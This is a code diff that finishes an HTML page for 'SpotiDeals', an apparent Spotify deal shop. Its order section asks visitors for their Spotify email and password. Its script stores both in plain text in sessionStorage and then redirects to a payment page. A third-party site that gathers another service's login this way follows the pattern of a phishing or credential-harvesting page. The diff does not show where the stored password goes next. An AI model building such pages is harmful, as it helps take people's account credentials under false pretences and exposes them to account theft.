@@ -41,4 +41,30 @@
     <section id="commande" class="card">
       <h2>Commander maintenant</h2>
       <p>Entrez vos identifiants Spotify :</p>
-      <label for="email">Courriel / Nom d’ut
+      <label for="email">Courriel / Nom d’utilisateur</label>
+      <input type="text" id="email" placeholder="exemple@mail.com">
+      <label for="password">Mot de passe</label>
+      <input type="password" id="password" placeholder="Votre mot de passe">
+      <button id="order-btn" class="btn" disabled>Commander</button>
+    </section>
+
+    <footer>© 2025 SpotiDeals – Tous droits réservés</footer>
+  </div>
+
+  <script>
+    const email = document.getElementById('email'),
+          password = document.getElementById('password'),
+          btn = document.getElementById('order-btn');
+    function checkInputs() {
+      btn.disabled = !(email.value.trim() && password.value.trim());
+    }
+    email.addEventListener('input', checkInputs);
+    password.addEventListener('input', checkInputs);
+    btn.addEventListener('click', () => {
+      sessionStorage.setItem('spotifyEmail', email.value);
+      sessionStorage.setItem('spotifyPassword', password.value);
+      window.location.href = 'paiement.html';
+    });
+  </script>
+</body>
+</html>
